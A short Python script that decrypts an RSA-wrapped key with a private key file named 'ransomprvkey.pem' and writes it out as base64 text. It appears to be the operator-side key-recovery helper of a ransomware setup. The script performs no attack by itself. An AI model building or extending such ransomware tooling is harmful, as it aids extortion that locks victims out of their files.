#!/usr/bin/env python3
from base64 import b64decode, b64encode
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA

#Decryption Key	
file_in = open("key.bin", "rb")
private_key = RSA.import_key(open("ransomprvkey.pem").read())
enc_data = file_in.read(private_key.size_in_bytes())
cipher_rsa = PKCS1_OAEP.new(private_key)
data = cipher_rsa.decrypt(enc_data) 
enKey = b64encode(data).decode('utf-8')
padding = "="
for char in padding:
	enKey = enKey.replace(char, "")
file_out = open("key.txt","w")
file_out.writelines(enKey)
file_out.close()
